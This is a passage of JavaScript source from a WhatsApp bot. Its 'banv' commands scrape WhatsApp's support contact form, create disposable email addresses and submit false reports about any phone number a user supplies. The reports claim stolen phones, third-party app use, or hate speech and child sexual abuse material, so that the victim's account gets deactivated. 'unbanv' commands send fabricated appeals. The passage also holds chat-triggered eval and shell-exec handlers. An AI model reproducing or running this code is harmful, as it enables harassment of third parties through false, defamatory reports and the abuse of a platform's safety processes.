form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
DeepakBotInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'banv2': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return replygcdeepak(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
let deepaknumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let deepaktesx = await DeepakBotInc.onWhatsApp(deepaknumx)
if (deepaktesx.length == 0) return replygcdeepak(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let deepakxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = deepakxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(deepakxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", deepaknumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Porfavor, desative o número da minha conta, o chip e os documentos foram roubados essa conta possuí dados importante, então, por favor desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
DeepakBotInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'banv3': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return replygcdeepak(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
let deepaknumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let deepaktesx = await DeepakBotInc.onWhatsApp(deepaknumx)
if (deepaktesx.length == 0) return replygcdeepak(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let deepakxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = deepakxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(deepakxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", deepaknumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/Roubado: Por favor, desative minha conta\n\nOlá, por favor desative este número, pois perdi meu celular e alguém está usando meu número, por favor desative meu número")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
DeepakBotInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'banv4': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return replygcdeepak(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
let deepaknumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let deepaktesx = await DeepakBotInc.onWhatsApp(deepaknumx)
if (deepaktesx.length == 0) return replygcdeepak(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let deepakxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = deepakxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(deepakxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", deepaknumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "UM DE SEUS USUÁRIOS, ESTA USANDO O APK DO WHATSAPP FEITO POR TERCEIROS E ESTA INDO CONTRA OS TERMOS DE SERVIÇO PEÇO QUE ANALISEM ESSE USUÁRIO")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
DeepakBotInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'banv5': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return replygcdeepak(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
deepaknumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let deepaktesx = await DeepakBotInc.onWhatsApp(deepaknumx)
if (deepaktesx.length == 0) return replygcdeepak(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let deepakxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = deepakxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(deepakxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", deepaknumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "مرحبًا ، يرجى إلغاء تنشيط هذا الرقم ، لأنني فقدت هاتفي وشخص ما يستخدم رقمي ، يرجى إلغاء تنشيط رقمي")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
DeepakBotInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'banv6': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return replygcdeepak(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
let deepaknumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let deepaktesx = await DeepakBotInc.onWhatsApp(deepaknumx)
if (deepaktesx.length == 0) return replygcdeepak(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let deepakxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = deepakxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(deepakxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", deepaknumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Esse número vem fazendo discurso ao ódio e divulgado conteúdo de porno infantil Numero")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
DeepakBotInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'unbanv1': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return replygcdeepak(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
let deepaknumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let deepaktesx = await DeepakBotInc.onWhatsApp(deepaknumx)
if (deepaktesx.length == 0) return replygcdeepak(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let deepakxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = deepakxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(deepakxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", deepaknumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Hello WhatsApp team, recently my WhatsApp number was suddenly blocked and I couldnt log into my account, in my account there is an important group like a school group and I have to read it but the account My WhatsApp is suddenly blocked, please restore my numbers")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
DeepakBotInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'unbanv2': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return replygcdeepak(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
let deepaknumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let deepaktesx = await DeepakBotInc.onWhatsApp(deepaknumx)
if (deepaktesx.length == 0) return replygcdeepak(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let deepakxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = deepakxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(deepakxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", deepaknumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Equipe, o sistema de vocês baniram meu número por engano. Peço que vocês reativem meu número pois tenho família em outro país e preciso me comunicar com eles")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
DeepakBotInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'unbanv3': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return replygcdeepak(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
let deepaknumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let deepaktesx = await DeepakBotInc.onWhatsApp(deepaknumx)
if (deepaktesx.length == 0) return replygcdeepak(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let deepakxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = deepakxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(deepakxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", deepaknumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Kepada pihak WhatsApp yang bijak Sana kenapa akun WhatsApp saya terblokir padahal aktifitas WhatsApp messenger saya normal normal saja mohon dibukakan kembali akun WhatsApp saya dengan ini saya cantumkan kode nomor akun WhatsApp messenger saya sekian banyak Terimakasih")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
DeepakBotInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'unbanv4': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return replygcdeepak(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
let deepaknumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let deepaktesx = await DeepakBotInc.onWhatsApp(deepaknumx)
if (deepaktesx.length == 0) return replygcdeepak(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let deepakxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = deepakxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(deepakxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", deepaknumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "مرحبًا whatsapp ، تم حظر حسابي بشكل دائم أو مؤقت ، يرجى إلغاء حظر حسابي\nالرقم")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
DeepakBotInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'unbanv5': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return replygcdeepak(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
let deepaknumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let deepaktesx = await DeepakBotInc.onWhatsApp(deepaknumx)
if (deepaktesx.length == 0) return replygcdeepak(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let deepakxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = deepakxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(deepakxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", deepaknumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Halo pak, Akun Whatsapp Saya diblokir Saya Maaf Saya Telah Menginstal Aplikasi Pihak Ketiga Secara Tidak Sengaja. Harap Buka Blokir Akun Saya Sesegera Mungkin. Terimakasih")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
DeepakBotInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break

            default:
                if (budy.startsWith('=>')) {
                    if (!DeepakTheCreator) return DeepakStickOwner()
                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                        if (sat == undefined) {
                            bang = util.format(sul)
                        }
                        return replygcdeepak(bang)
                    }
                    try {
                        replygcdeepak(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                    } catch (e) {
                        replygcdeepak(String(e))
                    }
                }

                if (budy.startsWith('>')) {
                    if (!DeepakTheCreator) return DeepakStickOwner()
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await replygcdeepak(evaled)
                    } catch (err) {
                        await replygcdeepak(String(err))
                    }
                }
                if (budy.startsWith('$')) {
                    if (!DeepakTheCreator) return DeepakStickOwner()
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return replygcdeepak(err)
                        if (stdout) return replygcdeepak(stdout)
                    })
                }
                if (isCmd && budy.toLowerCase() != undefined) {
if (m.chat.endsWith('broadcast')) return
if (m.isBaileys) return
let msgs = global.db.data.database
if (!(budy.toLowerCase() in msgs)) return
DeepakBotInc.copyNForward(m.chat, msgs[budy.toLowerCase()], true, {quoted: m})
}
            }
    } catch (err) {
        console.log(util.format(err))
        let e = String(err)
DeepakBotInc.sendMessage("917029257330@s.whatsapp.net", { text: "Hello developer, there seems to be an error, please fix it " + util.format(e), 
contextInfo:{
forwardingScore: 9999999, 
isForwarded: true
}})
if (e.includes("conflict")) return
if (e.includes("Cannot derive from empty media key")) return
if (e.includes("not-authorized")) return
if (e.includes("already-exists")) return
if (e.includes("rate-overlimit")) return
if (e.includes("Connection Closed")) return
if (e.includes("Timed Out")) return
if (e.includes("Value not found")) return
if (e.includes("Socket connection timeout")) return
    }
}
